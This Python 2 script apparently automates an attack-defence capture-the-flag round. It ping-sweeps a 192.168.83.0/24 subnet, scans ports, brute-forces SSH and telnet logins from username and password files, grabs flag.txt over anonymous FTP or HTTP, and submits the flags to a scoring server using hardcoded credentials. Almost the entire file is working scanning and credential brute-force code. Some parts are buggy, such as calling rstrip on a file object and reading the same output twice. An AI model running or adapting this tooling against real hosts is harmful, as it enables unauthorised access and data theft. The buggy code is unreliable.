import os
from ftplib import FTP
import threading
import socket
import paramiko
import telnetlib
import time
import urllib,urllib2,cookielib
result = []
n = 0
def ping(ip):
    ping = os.popen('arping -c 2 '+ip)
    if 'index' in ping.read():
        port(ip)
def port(ip):
    for port in range(1,100):
	socket.setdefaulttimeout(0.5)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((ip,port))
	    if port == 80:
#		ftp(ip,port)
#                ssh(ip,port)
#		telnet(ip,port)
		http(ip,port)
        except:pass
	finally:s.close()
#ssh
def ssh(ip,port):
    for name in open('user.txt','rt'):
        for passwd in open('passwd.txt','rt'):
	    try:
		print name,passwd
		ssh = paramiko.SSHClient()
    		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                passwd = passwd.rstrip('\n')
		name = name.rstrip('\n')
		ssh.connect(ip,port,name,passwd,timeout=2)
		cmd = 'ls'
		stdin,stout,stderr = ssh.exec_command(cmd)
		if '\n' in stout.read():
		    stout = stout.rstrip('\n')
		result.extend([ip,stout.read()])
		break
	    except:continue
#ftp
def Down(ip,ftp):
    try:
        result.append(ip)
        ftp.retrbinary('RETR flag.txt',result.append)
    except:result.remove(ip)
def ftp(ip,port):
        ftp = FTP(ip,timeout=1)
        if '230' in ftp.login():
            Down(ip,ftp)
#telnet
def login_pw(tn,username,password):
#    tn.set_debuglevel(2)
    tn.read_until('login:')
    tn.write(username + '\r')
    tn.read_until('assword:')
    tn.write(password + '\r')
    time.sleep(1)
    tn.read_some()
    a = tn.read_some()
    if 'from' in a:return 0
    elif '\n' in a:return 1
def write(tn,tips):
    tn.read_until(tips)
    tn.write('cd /\r')
    tn.read_until(tips)
    tn.write('more flag.txt\r')
    tn.read_until(tips)
    a = tn.read_very_lazy()
    tn.write('exit\r')
    return a
def telnet(ip,port):
    tips = '#'
    print('Telnet:'+ip)
    for name in open('user.txt','rt'):
        for passwd in open('passwd.txt','rt'):
            username = name.strip('\n')
	    password = passwd.strip('\n')
	    tn = telnetlib.Telnet(ip,port,timeout=1)
            login = login_pw(tn,username,password)
	    if login == 0:
		break
	if login == 0:
	    wr = write(tn,tips)
	    result.extend([ip,wr])
	    break
#http
def http(ip,port):
        url = 'http://'+str(ip)+':80/flag.txt'
        print('HTTP:Current search:'+str(ip))
        openurl = urllib2.urlopen(url,timeout=1).read().decode('utf-8')
        if len(openurl)>=1 and len(openurl)<=50:
	    if '\n' in openurl:
		openurl = openurl.rstrip('\n')
            result.extend([ip,openurl])
def save():
    global n
    ip = result[n]
    n += 1
    flag = result[n]
    n += 1
    url = 'http://192.168.83.1/'
    data = {'username':'USER001','password':'123456'}
    cj = cookielib.CookieJar()
    opender = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opender.headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    re = opender.open(url,urllib.urlencode(data))
    data1 = {'infoId':'2','paperId':'1','questionId':'2171','stepType':'2','ip':ip,'value':flag}
    url1 = 'http://192.168.83.1/front/setAnswer.json'
    urlre = opender.open(url1,urllib.urlencode(data1))
    print urlre.read()
if __name__ == '__main__':
    threads = []
    for i in range(1,255):
	ip = '192.168.83.'+str(i)
	t1 = threading.Thread(target=ping,args=(ip,))
        t1.start()
	threads.append(t1)
    for t in threads:t.join()
    print result
    for t in range(len(result)/2):
	save()
	time.sleep(11)
